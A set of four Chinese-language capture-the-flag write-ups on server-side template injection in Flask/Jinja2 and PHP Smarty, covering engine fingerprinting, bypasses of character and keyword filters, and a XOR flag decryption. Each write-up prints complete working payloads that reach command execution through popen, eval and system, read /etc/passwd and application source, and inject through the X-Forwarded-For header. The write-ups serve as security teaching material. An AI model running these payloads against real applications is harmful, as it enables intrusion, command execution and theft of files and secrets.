    [pasecactf_2019] flask_ssti — 只有三个字符被拦

    题目类型：Web — Flask SSTI（字符级过滤）+ 源码审计 + 异或解密

    题目地址：NSSCTF / ctf2 复刻环境

    Flag：CTF2{bcd6e1da-c4f1-4c73-83f8-f64ea78ed1cf}

    题目概述

    页面叫 Skype ScreenName Generator：

    Just type your nickname. We will do some unicode magic.

    输入昵称，它给你套一层花里胡哨的装饰，比如：

    ˜”*°★☆★_abc_★☆★°°*

    但这个页面一开始点不动——这是第一道坎。

    解题过程

    Step 1：页面能开，但按钮点了没反应

    页面加载正常，输入框也输得进去，就是点 "Go" 什么都不发生。

    按 F12 看 Console，发现 $ is not defined。原因是页面引了：

    https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js

    Google 的 CDN，国内连不上。jQuery 没加载，send() 里的 $.post 自然跑不了。

    绕过办法：

    ① 浏览器里按 ESC 停止加载（页面其实早就渲染完了）
② 让 Burp 把这条 CDN 请求 drop 掉
③ 直接看源码找接口，用 curl / python 发（最实用）

    Step 2：从源码里抠出接口

    页面里那段内联 JS 写得很清楚：

    function send(){
  let nickname = $('#nickname')[0].value;
  if(nickname.length > 0){
    $.post("/", {'nickname': nickname}, function(data){
      $('#msg')[0].innerHTML = '<b>' + data + '</b>';
    });
  }
}

    接口：POST /，参数名 nickname。

    Step 3：先确认模板被执行

    POST /            nickname={{7*7}}
→ 49 ~♡ⓛⓞⓥⓔ♡~

    模板被执行了。（{{7*'7'}} 也试了，回 49 —— 等等，这里要说明：这道题是 Python 的 Jinja2，{{7*'7'}} 应该回 7777777。我一开始只测了 {{7*7}}，靠后面的报错才确认是 Jinja。）

    Step 4：摸过滤 —— 只有三个字符

    先用 {{config}} 试，过了，返回一整个 Config 对象。说明不是关键词黑名单。

    但下面这些全报 Your nickname contains restricted characters!：

    {{url_for}}        ← 名字里有下划线
{{'__class__'}}    ← 有下划线 + 单引号
{{a.b}}            ← 有点
{{'a'}}            ← 有单引号

    能过的：

    {{"a"}}        双引号可以
{{[1,2]}}      方括号可以
{{1|abs}}      管道可以
{{dict}} {{lipsum}} {{config}} {{self}}    这些名字没下划线，能直接写

    所以过滤只有三个字符：

    _   下划线
'   单引号
.   点

    这三个一拦，常规链基本全废：没有 _ 就写不出 __class__，没有 . 就不能取属性。

    Step 5：把写不出来的字符"算"出来

    关键认知：过滤看的是你打的字面，而模板引擎会把转义还原。

    "\x5f"   →  _
"\x2e"   →  .

    验证：

    {{"\x5f\x5f"}}   →  __

    于是 __globals__ 可以写成 "\x5f\x5fglobals\x5f\x5f"，原文里一个下划线都没有。

    Step 6：两个优先级坑

    ① |attr() 后面不能直接跟 [...]，要加括号

    × lipsum|attr("\x5f\x5fglobals\x5f\x5f")["\x5f\x5fname\x5f\x5f"]     → Exception
✓ (lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fname\x5f\x5f"]   → jinja2.utils

    ② 方法名也要用下标取（因为 .read() 里的点被拦）

    × ...["open"]("/etc/passwd").read()       → 那个点触发过滤
✓ ...["open"]("/etc/passwd")["read"]()    → 正常

    为什么能用下标取方法？Jinja 的取值逻辑是：先试 obj[键]，失败再 getattr(obj, 键)。文件对象不能下标，于是回退到取属性，正好拿到 read 方法。

    打通之后：

    {{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["open"]("/etc/passwd")["read"]()}}
→ root:x:0:0:root:/root:/bin/ash ...

    Step 7：找到 flag 在哪儿

    先列根目录：

    {{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["listdir"]("/")}}
→ ['opt','root','media','home','proc','tmp','lib','etc','dev','sys','sbin','srv','var','run','mnt','usr','bin','app']

    根目录没有 flag 文件，但有个 /app——网站根目录。

    读源码（注意 app.py 里的点也要转义成 \x2e）：

    {{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["open"]("/app/app\x2epy")["read"]()}}

    ⚠️ listdir 要目录、open 要文件。我一开始给 listdir 传了个 .py 文件，直接 Exception——因为程序把所有异常都吞成了同一个词，看不出原因。

    Step 8：源码说 flag 已经被加密了

    拿到 /app/app.py，关键几行：

    def encode(line, key, key2):
    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

file = open("/app/flag", "r")
flag = file.read()
flag = flag[:42]

app.config['flag'] = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3',
                                  'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
flag = ""

os.remove("/app/flag")

    三件事：

    ① flag 被异或加密后存进 app.config['flag']
② 变量 flag 清空了
③ 原始文件 /app/flag 被删了

    所以拿到命令执行也没用——文件已经没了。这题真正要的是"看懂加密逻辑"。

    Step 9：取密文

    密文里有不可打印字符（\x08、\x10 这种），直接 {{config["flag"]}} 输出会被 HTML 转义搅乱。

    用 tojson：

    {{config["flag"]|tojson}}
→ "\u0008u\u0010Ew\u0013ajdU#7*\u000e\u001c\u000f<\u0006(DK\u001d\r\u0017!8\u0006h\u0002\n@\\pS,\u0026A<\u0017\\IG"

    不可打印字符全变成 \uXXXX，干净地传出来。

    Step 10：本地解密

    加密是：

    chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x]))

    异或可逆，反过来算就行：

    flag[i] = chr(密文[i] ^ i ^ ord(key倒序[i]) ^ ord(key2[i]))

    页面点不动 → jQuery 在 Google CDN，挂了
  → 看内联 JS 找到接口：POST /，参数 nickname
    → {{7*7}} = 49，模板被执行

    漏洞原理

    ① render_template_string(nicknames[id] % p) —— 用户输入直接当模板

    % 只是套一层装饰字符串，p 仍然原样进了模板。装饰不改变"它是代码"这个事实。

    ② 字符级过滤 ≠ 安全

    它拦的是 _ ' . 三个字符，而不是"模板注入"这件事本身。而这三个字符全都可以用转义表示：

    过滤看的：源码里的字面
引擎看的：转义还原后的值

    这个差和"关键词拼接绕过"是同一个原理，只是从"词"下沉到了"字符"。

    ③ 拿到 RCE 不等于拿到 flag

    这题把 flag 加密存进 config、删掉原文件。所以最后一步是读源码 + 自己实现解密，不是 cat。**

    关键知识点

    知识点 说明
    前端 JS 挂掉也能做题 看内联 JS 找接口，用 curl / python 直接发
    字符级过滤 _ ' . 三个字符被拦
    \x5f / \x2e 字符串转义，绕字符过滤
    转义只对字符串有效 url\x5ffor 不行——名字不能转义，只有字符串能
    \|attr() 后加括号 (x\|attr("y"))["z"]
    方法名用下标 ["read"]()，因为 .read() 的点被拦
    listdir vs open 一个要目录，一个要文件；给错就是 Exception
    \|tojson 保住不可打印字符，把 \x08 变成 \u0008
    os.remove 原文件删了 → 必须从 config 取密文
    异或可逆 加密函数反过来写就是解密

    [GYCTF2020] FlaskApp — 一张黑名单，两条链

    题目类型：Web — Flask SSTI（有过滤）

    题目地址：BUUCTF / ctf2 复刻环境

    Flag：CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}

    题目概述

    进入靶场发现是一个加解密的方式，先随便加密解密试试。

    这里发现，解密时会把解密的内容打印出来——那就有戏了。

    解题过程

    Step 1：{{7*7}} 返回 nonono

    先试一下 {{7*7}}，返回的是 nonono。

    这个 nonono 就明确了我们的思路是对的，只不过有东西被过滤了。

    接着我去试，发现被过滤的有这些：

    *  eval  os  subprocess  popen  import  system  request  flag

    （是子串匹配、不分大小写。所以 host 这种词也会中招 —— 里面含 os。）

    能过的是：config self session url_for lipsum globals builtins class open cat read +

    注意 + 没被过滤，所以后面全靠拼接绕过。

    Step 2：确认是 Flask，先试短路

    试试 {{config}}，出来了 Flask 的配置对象 —— 确认是 Flask（其实题名也提示了）。

    那先试试 url_for 能不能正常使用，结论是可行的：

    {{url_for}}   →  <function url_for at 0x...>

    Step 3：这里我卡住了 —— 页面没回显，Net 里看到重定向

    接着再试 {{url_for.__globals__}}，但是页面没有回显，看了一下 Net 发现被重定向了。

    这里我实在不明白原因。BP 抓包抓下来的响应里，session 里有一大串数据，但是解码不出来。

    后来搞明白了，记在这里：

    这题用的是 POST-Redirect-GET 模式：

    @app.route('/decode', methods=['GET','POST'])
def decode():
    if request.method == 'GET':
        res = session.pop('res', '')
        return render_template('decode.html', res=res)
    else:
        res = render_template_string(base64.b64decode(request.form['text']).decode())
        session['res'] = res          # 结果塞进 session（flash）
        return redirect('/decode')    # 302

    所以：

    ① 你看到的"结果"在重定向之后的 GET 页面里，不在 302 那个响应里
② 那一大串 cookie 就是 session —— 结果（可能很长）就装在里面
③ 结果越长，cookie 越大

    我看到的"没回显"，其实是在看 302 的响应体（内容是 Redirecting...）。跟过滤无关，是流程问题。

    Step 4：短路打通

    url_for.__globals__ 本身是通的，卡住的是再往下取 ['os'] —— 因为 os 在名单里。

    但 + 没被过滤，所以可以拼：

    {{url_for.__globals__['o'+'s']}}
→  <module 'os' from '/usr/local/lib/python3.7/os.py'>

    这个又能正常回显了。

    Step 5：先找文件名

    popen 被拦，所以也拼一下；然后先 ls /，因为我们还不知道 flag 叫什么：

    {{url_for.__globals__['o'+'s']['p'+'open']('ls /').read()}}

    app  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc
root  run  sbin  srv  sys  this_is_the_flag.txt  tmp  usr  var

    根目录下有个 this_is_the_flag.txt。文件名是这一步才知道的。

    Step 6：读出来

    注意 flag 这个词也被拦，所以路径也要拼（'this_is_the_fl' + 'ag.txt'）：

    {{url_for.__globals__['o'+'s']['p'+'open']('cat /this_is_the_fl'+'ag.txt').read()}}

    CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}

    Step 7：换一条路（长链）

    短路能通，是因为 Flask 注入了 url_for。换个环境把 url_for 删了，这条路就断。所以再走一遍长链——从字面量 '' 开始爬。

    {{''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first}}
→  <class '_py_warnings.catch_warnings'>

    （__name__ 是四个下划线；name 不出东西。另外 equalto 要加引号，不加会报 no test named Undefined。）

    然后接 ['__init__']['__globals__']['__builtins__']，拿到 builtins 的 dict。

    接下来我一开始想用 eval，直接给出去的版本报了 nonono，我不知道是哪个还被过滤了。

    答案：是 "os"。

    我把 import 拆了、popen 拆了、eval 拆了，唯独把 "os" 原样写在了字符串里 —— 那两个字面量照样会被匹配。

    拆开之后：

    ('__imp'+'ort__("o"+"s").pop'+'en("ls /").read()')

    完整的一条：

    {{(''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first)['__init__']['__globals__']['__builtins__']['eva'+'l']('__imp'+'ort__("o"+"s").pop'+'en("cat /this_is_the_fl"+"ag.txt").read()')}}

    也是先 ls / 再 cat，一样拿不到名字就没法读。

    解题思路总结

    加解密功能 → 解密的结果被当模板渲染
  → {{7*7}} 回 nonono → 有黑名单，但思路对
    → {{config}} 确认 Flask
      → url_for 能用 → 短路：url_for.__globals__
        → 卡在 ['os']（os 被拦）→ 拼成 ['o'+'s']
          → ls / 找到 this_is_the_flag.txt
            → cat 它（flag 也被拦，路径也拼）→ flag
              → 再走一遍长链验证：'' → subclasses → catch_warnings
                → __builtins__ → eval（import/os/popen 全要拆）→ flag

    漏洞原理

    ① 解密结果被当成模板源码

    res = render_template_string(base64.b64decode(text).decode())

    base64 只是把输入换了个形式，并没有让它变成"数据"。解密之后它照样进模板引擎求值。

    ② 黑名单是"词"，绕过靠"拼接"

    过滤器查的是你原文里有没有那串字母；Jinja 求值时会把 + 算掉，得到完整字符串。

    原文：'o'+'s'      → 不含 os
求值：'os'          → 才是真正的属性名

    过滤看"字面"，执行看"结果"——这两者的差，就是绕过空间。

    ③ 长链和短链的区别只在入口

    短链从框架注入的名字（url_for）出发，长链从字面量（''）出发。终点一样，都是拿到 __builtins__。

    关键知识点

    知识点 说明
    黑名单（本题） * eval os popen system import request subprocess flag，子串匹配
    + 拼接 'o'+'s' 绕 os；'this_is_the_fl'+'ag.txt' 绕 flag
    子串陷阱 host 里含 os 也会被拦——拆词时每一段都要检查
    POST-Redirect-GET 结果存 session，302 的响应体里没有结果
    结果越长 cookie 越大 因为结果被塞进了 session
    \|selectattr 按属性名筛，代替"数下标"跨环境稳定
    '__name__' vs 'name' 前者才有值，后者筛不出东西
    'equalto' 要加引号 不加时报 no test named Undefined
    双层拆分 eval 那条：Jinja 层拆一次，Python 源码再拆一次
    open vs eval open 只读文件，不碰 shell，名单里也没它——比 eval 省事
    两条链的完整 payload（实测）

    短路（url_for）

    {{url_for.__globals__['o'+'s']['p'+'open']('ls /').read()}}
{{url_for.__globals__['o'+'s']['p'+'open']('cat /this_is_the_fl'+'ag.txt').read()}}

    长链（subclasses + eval，双层拆分）

    {{(''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first)['__init__']['__globals__']['__builtins__']['eva'+'l']('__imp'+'ort__("o"+"s").pop'+'en("ls /").read()')}}

    长链（subclasses + open，只有一层拆分，更省事）

    {{(''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first)['__init__']['__globals__']['__builtins__']['open']('/this_is_the_fl'+'ag.txt').read()}}

    注意：open 版必须先知道文件名（靠 ls /），而且不能执行命令，只能读文件。

    两道黑名单自查（我踩过的）

    ① 以为 url_for.__globals__ 被拦了

    其实是 302 重定向，响应体里本来就没有结果。先分清"没执行"和"结果在下一页"。

    ② eval 那条报 nonono，找不到是哪个词

    逐个测试是最快的办法：把可疑的词单独包成 {{'xxx'}} 发一遍，看哪个返回 nonono。

    [BJDCTF2020] The mystery of ip — 认错引擎的一半时间

    题目类型：Web — SSTI（Smarty / PHP）

    题目地址：BUUCTF / ctf2 复刻环境

    Flag：CTF2{96ccbb12-bfb7-4d63-82a5-9424b108d493}

    题目概述

    进入靶场只有两个链接：flag 和 hint。

    hint 里没放东西。打开 flag，页面输出：

    Your IP is : 10.42.1.78

    问题来了：它怎么知道我的 IP 的？

    解题过程

    Step 1：既然它读 IP，那就伪造 IP

    服务器判断"你的 IP"，通常看 X-Forwarded-For 这类头（反向代理会加）。所以先手动改一个试试：

    curl.exe -k -H "X-Forwarded-For: TESTIP_9.9.9.9" "https://…:9999/flag.php"

    页面真的跟着变了 —— 说明这个头被原样拿来用。

    （这道题的平台给的是裸 TCP 地址，但它其实是个 HTTPS 服务，所以我直接用 https://host:9999/ 访问，不需要 nc / openssl。）

    Step 2：改完还能正常输出，那就试模板注入

    先上最基础的探针：

    X-Forwarded-For: {{7*7}}      →  49

    模板被执行了。但这一刻不要急着下结论。

    Step 3：{{7*'7'}} 才是分水岭

    X-Forwarded-For: {{7*'7'}}    →  49

    这个结果说明引擎把 '7' 当成数字处理了 —— 那是 PHP 系模板的行为。

    引擎 7*'7' 的结果
    Jinja2（Python） 7777777（字符串重复）
    Smarty / Twig（PHP） 49（转成数字相乘）

    所以这不是 Jinja2。看报错也印证了：

    Uncaught --> Smarty Compiler: Syntax error in template …
thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php

    sysplugins/smarty_internal_* 就是 Smarty 的源码目录。

    这一步我走了弯路：一开始按题名以为是 Flask 版，直接套 __class__ 那条链，结果报错说 Smarty 语法不对。只测 {{7*7}} 是不够的 —— Jinja 和 Smarty 都回 49。

    Step 4：确认 Smarty 版本

    X-Forwarded-For: {$smarty.version}


    Your IP is : 3.1.34-dev-7

    Smarty 3.1。这意味着 Smarty 2 时代的 {php}…{/php} 标签已经被移除了，那条路走不通。

    Step 5：Smarty 3 的路子是 {if}

    Smarty 的 {if} 表达式最终会被编译成 PHP 的 if (...)，而表达式里的函数调用会被原样写进编译结果。

    // {if phpinfo()}{/if}  编译后大致是：
if (phpinfo()) { }

    所以先验证这条路通不通：

    X-Forwarded-For: {if phpinfo()}{/if}

    成功返回了 phpinfo 页面。

    Step 6：先看环境，再读文件

    phpinfo 里翻两件事：

    disable_functions   →  空        （system / exec 都没禁）
open_basedir        →  没设      （没有被限制目录）

    顺手看了环境变量，只有一个 FLAG=not_flag：

    这是干扰项，别信。

    Step 7：执行命令

    注意 {if} 只判断真假，不打印值。所以要挑"自己会 echo 出来"的函数。system 属于这类。

    X-Forwarded-For: {if system('ls /')}{/if}

    根目录下有个 flag。

    Step 8：读出来

    X-Forwarded-For: {if system('cat /flag')}{/if}

    CTF2{96ccbb12-bfb7-4d63-82a5-9424b108d493}

    解题思路总结

    页面显示 "Your IP is" → 改 X-Forwarded-For 验证伪造
  → 改完还正常输出 → 试 {{7*7}} 得 49 → 模板被执行
    → {{7*'7'}} 也回 49 → 不是 Jinja2，是 PHP 系（Smarty）
      → 报错里的 smarty_internal_*.php 印证
        → {$smarty.version} 得 3.1.34 → {php} 标签已移除
          → {if phpinfo()}{/if} 成功 → {if} 里能调 PHP 函数
            → 看 disable_functions / open_basedir → 都没限制
              → {if system('ls /')}{/if} 看到 /flag
                → {if system('cat /flag')}{/if} 拿到 flag

    漏洞原理

    ① 输入来源不只是参数，还有请求头

    X-Forwarded-For 是代理用来传递客户端 IP 的头。如果应用直接信任它、又把它拼进模板，那就同时拿到"注入点"和"可伪造的输入"。

    ② 模板引擎把"表达式"编译成代码

    Smarty 把 {if 表达式} 编译成 PHP 的 if (表达式)。只要表达式里允许出现函数调用，就等于允许执行 PHP 函数。这和 Jinja 的 {{ }} 能访问对象属性是同一类问题的不同表现。

    ③ {if} 只判真假，不打印值

    if (phpinfo()) { }                    // phpinfo 自己会输出 → 能看到
if (file_get_contents('/flag')) { }   // 只返回字符串 → 页面空白

    所以要选"会输出"的函数（phpinfo、system、readfile、print），或者把返回值再套一层输出函数。

    关键知识点

    知识点 说明
    X-Forwarded-For 伪造客户端 IP；应用信任它就是注入点
    {{7*7}} 只证明"模板被执行"，不能分辨引擎
    {{7*'7'}} Jinja2 → 7777777；PHP 系 → 49
    Smarty 语法 {标签} / {$变量} / {$var\|修饰符}，没有对象属性访问
    {$smarty.version} Smarty 内置变量，看版本
    Smarty 2 vs 3 {php}…{/php} 在 3.x 已移除
    {if 函数()}{/if} Smarty 3 里调用 PHP 函数的入口
    disable_functions / open_basedir 决定拿到函数调用之后能走多远
    环境变量里的 FLAG=not_flag 干扰项，别信
    这题踩的两个坑

    ① 认错引擎

    只测了 {{7*7}} 回 49 就往 Jinja2 的 __class__ 链上走，报错才发现是 Smarty。

    教训：{{7*7}} 只证明"模板在执行"，{{7*'7'}} 才区分引擎。

    ② 中文引号

    手打 payload 时输入法给了 ‘’（U+2018/U+2019），Jinja/Smarty 都不认，报 unexpected char。

    打模板时把输入法切英文；报错里连位置都给了（at 2），照着看就行。

    [BJDCTF 2nd] fake google — 我的第一道 SSTI

    题目类型：Web — Flask / Jinja2 模板注入（SSTI）

    题目地址：BUUCTF / ctf2 复刻环境

    Flag：CTF2{4ba1fadc-b09a-441d-baf8-191ea2b8a4dd}

    题目概述

    进入界面只有一个输入框。

    先试 SQL 注入，发现无论输入什么，它都直接打印出来——不像是在查数据库。

    查看源码，在 qaq 那个位置发现了提示：sssssti & a little trick。这就是 SSTI，模板注入。

    这是我第一次做 SSTI，所以每一步都写下来了。

    解题过程

    Step 1：确认模板被执行

    {{7*7}}   →  49

    如果回显的是 {{7*7}} 原文，说明只是字符串拼接；回显 49，说明你的输入进了模板引擎，被真的求值了。

    Step 2：确认是 Jinja2

    {{7*'7'}}  →  7777777

    这个探针是用来区分引擎的：Jinja2 里 '7' 是字符串，重复 7 次得到 7777777；Twig（PHP）里会当成数字，得到 49。

    Step 3：确认是 Flask

    {{config}}   →  Flask 的配置对象

    config 是 Flask 注入模板的全局变量。它出现就说明是 Flask，顺便还可能看到 SECRET_KEY。

    到这一步，两条路都可以走了。

    路线一：从字面量往上爬（通用链）

    这条路不依赖任何框架给的名字，只靠 Python 的对象关系。

    第一环：字符串的类

    {{''.__class__}}     →  <class 'str'>

    第二环：它的父类

    {{''.__class__.__bases__[0]}}   →  <class 'object'>

    ⚠️ 这里有个坑：__base__（单数）是一个类，不能下标；__bases__（复数）是元组，才能写 [0]。写成 __base__[0] 会返回空。

    第三环：所有子类

    {{''.__class__.__bases__[0].__subclasses__()}}   →  一大串类

    这一步是分水岭：拿到的是内存里所有已加载的类。

    第四环：找一个“身上带着模块全局空间”的类

    核心思路：找一个 __init__.__globals__ 里带 __builtins__ 或者直接带 os 的类。

    常见的几个候选：

    catch_warnings        → warnings 模块，globals 里有 __builtins__
_wrap_close           → os 模块，globals 里直接有 popen
Popen                 → subprocess
FileLoader            → importlib

    怎么知道它们在列表第几个？我写了个本地脚本扫了一遍：

    import sys
for i, c in enumerate((''.__class__.__bases__[0].__subclasses__())):
    if c.__name__ in ('catch_warnings', '_wrap_close', 'Popen', 'FileLoader'):
        print(i, c.__name__, '->', c.__module__ + '.' + c.__name__)

    ⚠️ 下标是环境相关的。同样的脚本，在不同 Python 版本、不同 import 顺序下会给出不同的数字。我这边 catch_warnings 是 169、_wrap_close 是 117，靶机正好一致才打通的。换个环境就得重扫，或者用按名字筛的写法（见文末）。

    第五环：用 _wrap_close 直接拿 popen

    {{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}

    _wrap_close 是 os 模块里的类，它的 __init__.__globals__ 就是 os 模块的全局空间，里面直接有 popen，一步到位。

    另一种：用 catch_warnings 走 __builtins__

    {{''.__class__.__bases__[0].__subclasses__()[169].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /f*').read()")}}

    为什么要绕 eval 和 __import__？因为 catch_warnings 的 globals 里没有 os，但有 __builtins__；__builtins__ 里有 __import__，能 import 就能拿到任何模块。

    （__builtins__ 在不同上下文里有时是 dict、有时是模块，所以有的写法用 ['__builtins__']，有的用 .builtins__——注意前者是取键，后者是取属性。）

    路线二：从框架给的钩子走（快）

    既然确认了是 Flask，就先看看模板里现成给了什么：

    {{url_for}}   →  <function url_for at 0x...>

    它是函数——函数身上就有 __globals__。所以不需要爬几百个子类：

    {{url_for.__globals__}}                  →  一大坨 dict
{{(url_for.__globals__)['os']}}          →  <module 'os' ...>
{{(url_for.__globals__)['os'].popen('cat /f*').read()}}

    三行就出 flag。

    这就是两条路的区别：

    路线一（长）：'' → 类 → 父类 → 所有子类 → 挑一个 → __globals__ → 执行
路线二（短）：url_for → __globals__ → os → 执行

    路线二快，但依赖 Flask 注入了 url_for；路线一慢，但只要是 Python 就通。实战里先试短的，不通再走长的。

    解题思路总结

    一个输入框 → 试 SQL 注入，内容被原样打印
  → 看源码，qaq 里有提示 sssssti
    → {{7*7}} = 49        确认模板被执行
      → {{7*'7'}} = 7777777  确认是 Jinja2
        → {{config}}        确认是 Flask
          ├─ 路线一：'' → __class__ → __bases__[0] → __subclasses__()
          │           → 挑 _wrap_close(117) / catch_warnings(169)
          │             → __init__.__globals__ → popen / __builtins__ → 执行
          └─ 路线二：url_for → __globals__ → ['os'] → popen → 执行

    漏洞原理

    ① Jinja2 的 {{ }} 里是表达式，会被求值

    用户输入被拼进模板字符串后，{{ }} 里的内容不再当文字，而是交给 Python 求值。这是 SSTI 成立的第一步。

    ② Python 的属性访问没有边界

    从任何一个对象出发，都能顺着 __class__（类）→ __mro__ / __bases__（父类）→ __subclasses__()（所有子类）→ __init__.__globals__（定义时的模块空间）走到执行。这不是漏洞，是语言特性；漏洞在于模板允许你访问这些属性。

    ③ 框架注入的全局变量是“现成的入口”

    Flask 会把 config、request、session、url_for、lipsum、get_flashed_messages 放进模板名字空间。它们本身是函数或对象，身上挂着 __globals__，等于给了一条捷径。

    关键知识点

    知识点 说明
    {{7*7}} / {{7*'7'}} 引擎探测：回显 49 / 7777777 说明是 Jinja2
    {{config}} Flask 的模板全局，能确认框架、有时能读到 SECRET_KEY
    __class__ 任何对象都能拿到它的类
    __base__ vs __bases__ 前者是单个父类（不可下标），后者是元组（可 [0]）
    __subclasses__() 内存里所有已加载的类，但下标因环境而异
    __globals__ 函数定义时所在的模块全局空间（只有 Python 层函数有，C 层 wrapper 没有）
    __builtins__ 里面有 __import__，能 import 就能拿任何模块
    点号 vs 方括号 . 取属性，['x'] 取键，不能写成 .['x']
    生成器 map / selectattr 返回惰性生成器，要 \|first 或 \|list 才有值
    按名字筛代替下标 \|selectattr('__name__','equalto','xxx')\|first，跨环境稳定
    遇到过滤 .__globals__ 用 \|attr('__globals__') 换形状（本题没有过滤，用不上）
    两条链的完整 payload（本题实测） 
    # 路线一 · _wrap_close：globals 里直接有 popen
{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}

# 路线一 · catch_warnings：走 __builtins__ → __import__
{{''.__class__.__bases__[0].__subclasses__()[169].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /f*').read()")}}

# 路线二 · url_for 短路
{{(url_for.__globals__)['os'].popen('cat /f*').read()}}
    跨环境更稳的写法：按名字找，不记下标 
    {{''.__class__.__bases__[0].__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first|attr('__init__').__globals__}}

    selectattr 按属性名筛，\first 取第一个 —— 不需要知道它在第几个。 如果连 .__globals__ 这种形状都被过滤，就换成 |attr('__globals__')。
